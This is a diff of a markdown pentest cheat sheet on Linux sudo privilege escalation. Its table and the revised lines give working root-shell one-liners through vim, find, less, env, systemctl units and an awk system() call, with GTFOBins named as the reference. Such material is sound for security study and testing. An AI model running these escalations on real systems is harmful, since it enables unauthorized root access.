@@ -29,11 +29,11 @@ Every line is a path:
 |---|---|
 | `(ALL) NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!/bin/sh'` |
 | `... /usr/bin/find` | `sudo find . -exec /bin/sh \; -quit` |
-| `... /bin/systemctl` | `sudo systemctl edit`, own unit with `ExecStart=/bin/sh` |
+| `... /bin/systemctl` | `sudo systemctl` (pager → `!sh`) or `systemctl link` a unit with `ExecStart=/bin/sh` + `enable --now` |
 | `... /usr/bin/less` | `!sh` from the pager |
 | `... /usr/bin/env` | `sudo env /bin/sh` |
 
-GTFOBins is the reference: find the binary and the **Sudo** section. Watch for wildcard rules: `sudo /usr/bin/awk '*'` is usually direct execution.
+GTFOBins is the reference: find the binary and the **Sudo** section. Watch for wildcard rules: with `/usr/bin/awk *` execution is direct, `sudo awk 'BEGIN {system("/bin/sh")}'`.
 
 ## 3. SUID and capabilities
 
